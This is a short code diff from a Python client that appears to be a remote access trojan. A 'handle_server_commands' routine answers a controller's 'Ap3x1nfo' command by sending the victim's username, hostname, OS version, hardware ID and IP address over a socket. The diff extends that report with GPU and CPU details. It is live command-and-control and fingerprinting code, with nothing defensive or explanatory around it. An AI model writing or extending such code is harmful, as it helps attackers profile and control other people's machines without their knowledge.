@@ -151,8 +151,23 @@ def handle_server_commands(client_socket):
                     data_transfering = False
             elif data == "Ap3x1nfo":
                 try:
+                    import cpuinfo
+                    import GPUtil
+                    try: # GPU ***
+                        gpus = GPUtil.getGPUs()
+                        if gpus:
+                            for gpu in gpus:
+                                gpu_name = gpu.name
+                        else:
+                            gpu_name = "Unable to get GPU"
+                    except:
+                        gpu_name = "Unable to get GPU"
+                        pass
+                    info = cpuinfo.get_cpu_info()
+                    cpu_name = info['brand_raw']
+
                     data_transfering = True
-                    client_socket.send(f"Ap3x1nfo::{username}::{hostname}::{os_version}::{build}::{hwid}::{ip_address}".encode())
+                    client_socket.send(f"Ap3x1nfo::{username}::{hostname}::{os_version}::{build}::{hwid}::{ip_address}::{gpu_name}::{cpu_name}".encode())
                 except:
                     pass
                 finally:
